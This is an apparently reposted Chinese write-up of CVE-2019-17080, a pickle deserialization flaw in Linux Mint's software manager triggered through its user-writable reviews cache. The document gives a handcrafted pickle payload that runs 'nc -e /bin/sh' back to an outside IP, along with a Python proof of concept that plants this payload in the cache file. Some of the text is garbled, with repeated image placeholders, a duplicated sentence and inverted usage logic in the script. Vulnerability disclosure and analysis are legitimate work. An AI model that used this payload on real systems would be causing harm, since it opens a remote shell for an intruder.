# （CVE-2019-17080）Mintinstall object injection

> 原文：[https://www.zhihuifly.com/t/topic/3020](https://www.zhihuifly.com/t/topic/3020)

# （CVE-2019-17080）Mintinstall object injection

## 一、漏洞简介

Linux mint软件管理器（v 7.9.5 / 9）由于配置错误而导致对象注入和任意代码执行。

Linux Mint Software Manager（v 7.9.5 / 9）由于配置错误而导致我们执行对象注入和任意代码

## 二、漏洞影响

Version: 7.9.9

## 三、复现过程

```
mintinsall 
```

我们运行Mint软件管理器还会检查是否有新注释，如果[new-reviews.list](https://community.linuxmint.com/data/) 下载中有 新注释并写入文件。

如果有新评论，请从文件[new-reviews.list](https://community.linuxmint.com/data/)下载并写入文件

![](img/841b6d0af7ed1e66c899bca37d6e664e.png)

```
code mintinstall.py 
```

首次启动软件管理器时，它会从评论模块调用ReviewCache（）类。

![](img/841b6d0af7ed1e66c899bca37d6e664e.png)

### 它如何处理数据？

```
code reviews.py 
```

当ReviewCache类启动（init）时，它将调用_load_cache（）函数。

![](img/841b6d0af7ed1e66c899bca37d6e664e.png)

加载缓存功能读取REVIEWS_CACHE变量中的文件，并在pickle模块的帮助下，对文件中的数据进行反序列化并在内存中保存一些值

![](img/841b6d0af7ed1e66c899bca37d6e664e.png)

![](img/841b6d0af7ed1e66c899bca37d6e664e.png)

![](img/841b6d0af7ed1e66c899bca37d6e664e.png)

当我检查文件时，看起来好像可以写文件。

![](img/841b6d0af7ed1e66c899bca37d6e664e.png)

[Pickle](https://docs.python.org/3.6/library/pickle.html) 因为我们可以使用模块执行序列化/反序列化操作，所以可以包含模块并使用reduce方法执行任意代码。

![](img/841b6d0af7ed1e66c899bca37d6e664e.png)

如果您尝试反序列化文件，则我们的恶意代码将起作用。

```
cos 
system 
(S'nc -e /bin/sh 192.168.2.138 4545' 
tR.
>>modül adı c{os}
>> fonksiyon
( >> işaretleyici nesnesi 
S >> tırnak sonuna kadar okuyup stack'e at
tR. >> stackte olanları çagır ve sonucu stacke yerleştir. 
```

![](img/841b6d0af7ed1e66c899bca37d6e664e.png)

![alt-text](img/841b6d0af7ed1e66c899bca37d6e664e.png)

poc

```
import os
import sys
def shellCode(payload):
    with open(f"{os.getenv('HOME')}/.cache/mintinstall/reviews.cache","w") as wb:
        wb.write(payload)
    print("[+] Start mintinstall")
if __name__=="__main__":
    shellCode(f"""cos\nsystem\n(S"nc -e /bin/sh {sys.argv[1]} {sys.argv[2]}"\ntR.""")
else:
    print("[!] exploit.py [IP] [PORT]") 
```